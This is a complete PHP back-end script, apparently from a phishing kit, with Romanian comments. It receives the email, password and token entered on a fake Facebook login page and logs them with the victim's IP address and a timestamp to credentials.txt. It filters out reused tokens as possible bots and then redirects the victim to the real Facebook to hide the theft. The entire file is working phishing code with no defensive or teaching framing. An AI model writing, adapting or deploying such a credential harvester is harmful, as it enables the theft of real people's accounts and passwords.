<?php
// save.php - Salvează credentialele și redirecționează

$email = $_POST['email'] ?? '';
$password = $_POST['pass'] ?? '';
$token = $_POST['token'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$timestamp = date('Y-m-d H:i:s');

// Verifică token-ul (să nu fie folosit de două ori)
$token_file = 'used_tokens.txt';
if (file_exists($token_file)) {
    $used = file($token_file, FILE_IGNORE_NEW_LINES);
    if (in_array($token, $used)) {
        // Token deja folosit - posibil bot
        header('Location: https://www.facebook.com');
        exit;
    }
}
// Salvează token-ul ca folosit
file_put_contents($token_file, $token . PHP_EOL, FILE_APPEND);

// Salvează credentialele
$log = "[$timestamp] IP: $ip | Email: $email | Password: $password | Token: $token" . PHP_EOL;
file_put_contents('credentials.txt', $log, FILE_APPEND);

// Redirecționează la Facebook real
header('Location: https://www.facebook.com');
exit;
?>